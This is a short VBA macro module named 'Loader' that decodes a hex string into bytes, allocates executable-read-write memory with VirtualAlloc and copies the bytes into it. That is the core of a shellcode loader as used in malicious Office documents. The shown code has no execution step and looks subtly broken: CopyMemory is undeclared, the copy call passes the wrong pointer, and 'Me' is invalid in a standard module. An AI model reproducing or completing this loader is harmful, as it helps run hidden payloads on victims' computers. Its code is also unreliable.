Attribute VB_Name = "Loader"
Private Declare Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
Public Sub Run(ByVal hexs As String)
    Dim buf() As Byte
    Dim i As Long
    Dim lpAddr As Long
    For i = 1 To Len(hexs) Step 2
        ReDim Preserve buf(i \ 2)
        buf(i \ 2) = CByte("&h" & Mid(hexs, i, 2))
    Next i
    lpAddr = VirtualAlloc(0, UBound(buf) + 1, &H1000, &H40)
    CopyMemory ByVal lpAddr, VarPtr(buf(0)), UBound(buf) + 1
    Dim self As Long
    self = ObjPtr(Me)
End Sub
